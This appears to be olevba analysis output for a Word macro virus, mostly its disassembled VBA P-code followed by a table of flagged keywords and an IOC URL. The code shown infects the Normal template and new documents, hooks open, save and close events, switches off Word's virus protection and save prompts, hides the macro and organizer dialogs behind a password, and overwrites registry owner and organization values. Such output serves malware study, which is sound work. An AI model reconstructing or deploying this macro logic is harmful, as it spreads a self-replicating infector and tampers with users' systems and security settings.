' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #164:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #165:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Sub FileClose())
' Line #169:
' 	Dim 
' 	VarDefn afn (As String)
' Line #170:
' 	ArgsCall bday 0x0000 
' Line #171:
' 	ArgsCall act 0x0000 
' Line #172:
' 	ArgsCall AnimateCaption 0x0000 
' Line #173:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #174:
' 	OnError (Resume Next) 
' Line #175:
' 	ArgsCall AutoClose 0x0000 
' Line #176:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St afn 
' Line #177:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #178:
' 	Ld afn 
' 	ArgsCall ModifyAttr 0x0001 
' Line #179:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #180:
' 	EndSub 
' Line #181:
' Line #182:
' 	FuncDefn (Sub FileSave())
' Line #183:
' 	ArgsCall bday 0x0000 
' Line #184:
' 	ArgsCall act 0x0000 
' Line #185:
' 	ArgsCall AnimateCaption 0x0000 
' Line #186:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #187:
' Line #188:
' 	ArgsCall Copy2Document 0x0000 
' Line #189:
' 	OnError (Resume Next) 
' Line #190:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #191:
' 	ArgsMemCallWith Save 0x0000 
' Line #192:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #193:
' 	EndWith 
' Line #194:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #195:
' 	EndSub 
' Line #196:
' Line #197:
' 	FuncDefn (Sub InitDialog())
' Line #198:
' 	ArgsCall Stealth 0x0000 
' Line #199:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #200:
' 	OnError (Resume Next) 
' Line #201:
' 	SetStmt 
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsOptionsDlg 
' Line #202:
' 	SetStmt 
' 	Ld wdDialogOrganizer 
' 	ArgsLd Dialogs 0x0001 
' 	Set OrganizerDlg 
' Line #203:
' 	SetStmt 
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsTemplatesDlg 
' Line #204:
' 	SetStmt 
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsMacrosDlg 
' Line #205:
' 	SetStmt 
' 	Ld wdDialogFormatStyle 
' 	ArgsLd Dialogs 0x0001 
' 	Set FormatStyleDlg 
' Line #206:
' 	EndSub 
' Line #207:
' Line #208:
' 	FuncDefn (Sub AutoExec())
' Line #209:
' 	Dim 
' 	VarDefn Combar (As CommandBar)
' Line #210:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #211:
' 	ArgsCall InitDialog 0x0000 
' Line #212:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #213:
' 	ArgsCall AnimateCaption 0x0000 
' Line #214:
' 	ArgsCall Copy2Normal 0x0000 
' Line #215:
' 	Ld NormalTemplate 
' 	ArgsLd getInfected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Copy2Document 0x0000 
' 	EndIf 
' Line #216:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #217:
' 	ArgsCall Buggy 0x0000 
' Line #218:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ForEach 
' Line #219:
' Line #220:
' Line #221:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	NextVar 
' Line #222:
' 	EndSub 
' Line #223:
' Line #224:
' 	FuncDefn (Sub AutoExit())
' Line #225:
' 	ArgsCall AutoOpen 0x0000 
' Line #226:
' 	ArgsCall AnimateCaption 0x0000 
' Line #227:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #228:
' 	EndSub 
' Line #229:
' Line #230:
' 	FuncDefn (Sub fileNewDefault())
' Line #231:
' 	ArgsCall AnimateCaption 0x0000 
' Line #232:
' 	Ld WordBasic 
' 	ArgsMemCall fileNewDefault 0x0000 
' Line #233:
' 	ArgsCall Copy2Document 0x0000 
' Line #234:
' 	EndSub 
' Line #235:
' Line #236:
' 	FuncDefn (Sub FileNew())
' Line #237:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #238:
' 	ArgsCall AnimateCaption 0x0000 
' Line #239:
' 	ArgsCall Copy2Document 0x0000 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	EndSub 
' Line #242:
' Line #243:
' 	FuncDefn (Sub Stealth())
' Line #244:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #245:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #246:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #247:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #248:
' 	EndWith 
' Line #249:
' 	EndSub 
' Line #250:
' Line #251:
' 	FuncDefn (Sub NoStealth())
' Line #252:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #253:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #254:
' 	LitVarSpecial (True)
' 	MemStWith SavePropertiesPrompt 
' Line #255:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #256:
' 	EndWith 
' Line #257:
' 	EndSub 
' Line #258:
' Line #259:
' 	FuncDefn (Sub ToolsOptions())
' Line #260:
' 	ArgsCall InitDialog 0x0000 
' Line #261:
' 	ArgsCall NoStealth 0x0000 
' Line #262:
' 	OnError (Resume Next) 
' Line #263:
' 	Ld ToolsOptionsDlg 
' 	ArgsMemCall Display 0x0000 
' Line #264:
' 	ArgsCall AnimateCaption 0x0000 
' Line #265:
' 	ArgsCall Stealth 0x0000 
' Line #266:
' 	EndSub 
' Line #267:
' Line #268:
' 	FuncDefn (Sub NoAccess())
' Line #269:
' 	Ld msg 
' 	Ld vbExclamation 
' 	Ld abadacc 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #270:
' 	ArgsCall AnimateCaption 0x0000 
' Line #271:
' 	EndSub 
' Line #272:
' Line #273:
' 	FuncDefn (Function passDialog() As Boolean)
' Line #274:
' 	Dim 
' 	VarDefn cruel (As String)
' Line #275:
' 	LitVarSpecial (False)
' 	St passDialog 
' Line #276:
' 	Ld ccc 
' 	Ld code 
' 	LitDI2 0x0009 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St cruel 
' Line #277:
' 	Ld pass 
' 	Ld badboy 
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd LCase 0x0001 
' 	Ld cruel 
' 	Eq 
' 	IfBlock 
' Line #278:
' 	LitVarSpecial (True)
' 	St passDialog 
' Line #279:
' 	ElseBlock 
' Line #280:
' 	ArgsCall NoAccess 0x0000 
' Line #281:
' 	EndIfBlock 
' Line #282:
' 	EndFunc 
' Line #283:
' Line #284:
' Line #285:
' 	FuncDefn (Sub ToolsMacro())
' Line #286:
' 	ArgsCall InitDialog 0x0000 
' Line #287:
' 	Ld ToolsMacrosDlg 
' 	ArgsMemCall Display 0x0000 
' Line #288:
' 	ArgsCall AnimateCaption 0x0000 
' Line #289:
' 	EndSub 
' Line #290:
' Line #291:
' 	FuncDefn (Sub FileTemplates())
' Line #292:
' 	ArgsCall InitDialog 0x0000 
' Line #293:
' 	Ld ToolsTemplatesDlg 
' 	ArgsMemCall Display 0x0000 
' Line #294:
' 	QuoteRem 0x0000 0x0029 "    CustomizationContext = NormalTemplate"
' Line #295:
' 	ArgsCall AnimateCaption 0x0000 
' Line #296:
' 	EndSub 
' Line #297:
' Line #298:
' 	FuncDefn (Sub viewvbcode())
' Line #299:
' 	Ld passDialog 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #300:
' 	EndSub 
' Line #301:
' Line #302:
' 	FuncDefn (Sub viewcode())
' Line #303:
' 	ArgsCall viewvbcode 0x0000 
' Line #304:
' 	EndSub 
' Line #305:
' Line #306:
' 	FuncDefn (Sub Organizer())
' Line #307:
' 	ArgsCall InitDialog 0x0000 
' Line #308:
' 	Ld OrganizerDlg 
' 	ArgsMemCall Display 0x0000 
' Line #309:
' 	ArgsCall AnimateCaption 0x0000 
' Line #310:
' 	EndSub 
' Line #311:
' Line #312:
' 	FuncDefn (Sub FormatStyle())
' Line #313:
' 	ArgsCall InitDialog 0x0000 
' Line #314:
' 	StartWithExpr 
' 	Ld FormatStyleDlg 
' 	With 
' Line #315:
' 	ArgsMemCallWith Display 0x0000 
' Line #316:
' 	ArgsMemCallWith Execute 0x0000 
' Line #317:
' 	EndWith 
' Line #318:
' 	ArgsCall AnimateCaption 0x0000 
' Line #319:
' 	EndSub 
' Line #320:
' Line #321:
' 	FuncDefn (Sub ModifyAttr(fileName As String))
' Line #322:
' 	OnError (Resume Next) 
' Line #323:
' 	Ld fileName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld fileName 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #324:
' 	EndSub 
' Line #325:
' Line #326:
' 	FuncDefn (Sub AnimateCaption())
' Line #327:
' 	OnError (Resume Next) 
' Line #328:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' 	EndIf 
' Line #329:
' 	Ld Animated 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #330:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	St anIntv 
' Line #331:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #332:
' 	Ld OFC 
' 	St anCap 
' Line #333:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #334:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #335:
' 	EndSub 
' Line #336:
' Line #337:
' 	FuncDefn (Sub ScrollCaption())
' Line #338:
' 	Ld Animated 
' 	IfBlock 
' Line #339:
' 	Ld anCap 
' 	Ld anPos 
' 	ArgsLd Right$ 0x0002 
' 	Ld Application 
' 	MemSt Caption 
' Line #340:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld anIntv 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #341:
' 	Ld anPos 
' 	LitDI2 0x0001 
' 	Add 
' 	St anPos 
' Line #342:
' 	EndIfBlock 
' Line #343:
' Line #344:
' 	Ld anPos 
' 	Ld anCap 
' 	FnLen 
' 	Gt 
' 	IfBlock 
' Line #345:
' 	OnError (Resume Next) 
' Line #346:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #347:
' Line #348:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #349:
' 	Ld anCap 
' 	Ld OFC 
' 	Eq 
' 	IfBlock 
' Line #350:
' 	Ld Peace 
' 	St anCap 
' Line #351:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #352:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #353:
' 	Ld anCap 
' 	Ld Peace 
' 	Eq 
' 	ElseIfBlock 
' Line #354:
' 	Ld mw 
' 	St anCap 
' Line #355:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #356:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #357:
' 	Ld anCap 
' 	Ld mw 
' 	Eq 
' 	ElseIfBlock 
' Line #358:
' 	Ld OFC 
' 	St anCap 
' Line #359:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x04B0 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #360:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #361:
' 	EndIfBlock 
' Line #362:
' 	EndIfBlock 
' Line #363:
' 	EndSub 
' Line #364:
' Line #365:
' 	FuncDefn (Sub bday())
' Line #366:
' 	Dim 
' 	VarDefn msg (As String)
' 	VarDefn ent (As String)
' 	VarDefn quo (As String)
' Line #367:
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	St ent 
' Line #368:
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	St quo 
' Line #369:
' 	OnError (Resume Next) 
' Line #370:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #371:
' 	LitStr 0x0023 "      SELAMAT ULANG TAHUN untuk Chd"
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #372:
' 	Ld msg 
' 	LitStr 0x002B "     Semoga panjang umur dan sukses selalu."
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #373:
' 	Ld msg 
' 	LitStr 0x0031 "Untuk itu sebaiknya anda meliburkan diri hari ini"
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #374:
' 	Ld msg 
' 	LitStr 0x002A "dan memberikan ucapan selamat juga untuk, "
' 	Concat 
' 	Ld quo 
' 	Concat 
' 	LitStr 0x0003 "Chd"
' 	Concat 
' 	Ld quo 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	St msg 
' Line #375:
' 	Ld msg 
' 	Ld ent 
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	LitStr 0x0027 "                        - Terimakasih -"
' 	Concat 
' 	St msg 
' Line #376:
' 	Ld msg 
' 	Ld ent 
' 	Concat 
' 	LitStr 0x002C ".:: CrlShtVvMrtAchSnRsyDdStrBsyEdwAndDj ::. "
' 	Concat 
' 	St msg 
' Line #377:
' 	Ld msg 
' 	LitDI2 0x0040 
' 	Ld OFC 
' 	ArgsCall MsgBox 0x0003 
' Line #378:
' 	QuoteRem 0x0000 0x003F "        Application.OnTime Now + TimeSerial(0, 5, 0), "appexit""
' Line #379:
' 	LitDI2 0x0002 
' 	Ld System 
' 	MemSt Cursor 
' Line #380:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #381:
' 	LitStr 0x0023 "      SELAMAT ULANG TAHUN untuk Sht"
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #382:
' 	Ld msg 
' 	LitStr 0x002B "     Semoga panjang umur dan sukses selalu."
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #383:
' 	Ld msg 
' 	LitStr 0x0031 "Untuk itu sebaiknya anda meliburkan diri hari ini"
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #384:
' 	Ld msg 
' 	LitStr 0x002A "dan memberikan ucapan selamat juga untuk, "
' 	Concat 
' 	Ld quo 
' 	Concat 
' 	LitStr 0x0003 "Sht"
' 	Concat 
' 	Ld quo 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	St msg 
' Line #385:
' 	Ld msg 
' 	Ld ent 
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	LitStr 0x0027 "                        - Terimakasih -"
' 	Concat 
' 	St msg 
' Line #386:
' 	Ld msg 
' 	Ld ent 
' 	Concat 
' 	LitStr 0x002C ".:: CrlShtVvMrtAchSnRsyDdStrBsyEdwAndDj ::. "
' 	Concat 
' 	St msg 
' Line #387:
' 	Ld msg 
' 	LitDI2 0x0040 
' 	Ld OFC 
' 	ArgsCall MsgBox 0x0003 
' Line #388:
' 	QuoteRem 0x0000 0x003F "        Application.OnTime Now + TimeSerial(0, 5, 0), "appexit""
' Line #389:
' 	LitDI2 0x0002 
' 	Ld System 
' 	MemSt Cursor 
' Line #390:
' 	ElseBlock 
' Line #391:
' 	ExitSub 
' Line #392:
' 	EndIfBlock 
' Line #393:
' 	EndSub 
' Line #394:
' Line #395:
' 	FuncDefn (Sub act())
' Line #396:
' 	OnError (Resume Next) 
' Line #397:
' 	Dim 
' 	VarDefn org (As String)
' Line #398:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #399:
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "RegisteredOwner"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #400:
' 	Ld org 
' 	Ld mname 
' 	Ne 
' 	IfBlock 
' Line #401:
' 	LitStr 0x0006 "Shinta"
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	LitStr 0x001C "Control Panel\International\"
' 	Concat 
' 	LitStr 0x0005 "s1159"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #402:
' 	LitStr 0x0006 "Shinta"
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	LitStr 0x001C "Control Panel\International\"
' 	Concat 
' 	LitStr 0x0005 "s2359"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #403:
' 	Ld OFC 
' 	LitStr 0x0004 "...."
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
' 	LitStr 0x0007 "InfoTip"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #404:
' 	Ld OFC 
' 	LitStr 0x0007 " &u&b&d"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x001C "Internet Explorer\PageSetup\"
' 	Concat 
' 	LitStr 0x0006 "footer"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #405:
' 	Ld mname 
' 	LitStr 0x0012 " &w&bPage &p of &P"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	LitStr 0x001C "Internet Explorer\PageSetup\"
' 	Concat 
' 	LitStr 0x0006 "header"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #406:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0008 "OrgOwner"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #407:
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #408:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "OrgOrganization"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #409:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "DefName"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #410:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "OrgName"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #411:
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "DefCompany"
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St org 
' Line #412:
' 	Ld org 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "OrgCompany"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #413:
' 	Ld Peace 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x0007 "DefName"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #414:
' 	Ld mname 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld ACME 
' 	Concat 
' 	LitStr 0x000A "DefCompany"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #415:
' 	Ld mname 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000F "RegisteredOwner"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #416:
' 	Ld isoft 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #417:
' 	EndIfBlock 
' Line #418:
' 	EndWith 
' Line #419:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #420:
' 	Ld mname 
' 	MemStWith UserName 
' Line #421:
' 	LitStr 0x0003 "Sht"
' 	MemStWith UserInitials 
' Line #422:
' 	EndWith 
' Line #423:
' 	ArgsCall Stealth 0x0000 
' Line #424:
' 	StartWithExpr 
' 	LitDI2 0x0056 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #425:
' 	LitStr 0x001C "Shinta Yulianti - LitTle_bUg"
' 	MemStWith Author 
' Line #426:
' 	Ld OFC 
' 	MemStWith Title 
' Line #427:
' 	Ld Peace 
' 	MemStWith Subject 
' Line #428:
' 	LitStr 0x002B "This is not dangerous virus, please do not "
' 	LitStr 0x0029 "delete or modify this macros. Thank you. "
' 	Concat 
' 	MemStWith Comments 
' Line #429:
' 	ArgsMemCallWith Execute 0x0000 
' Line #430:
' 	EndWith 
' Line #431:
' 	EndSub 
' Line #432:
' Line #433:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://rascal321.cjb|URL                                          |
|          |.net                |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

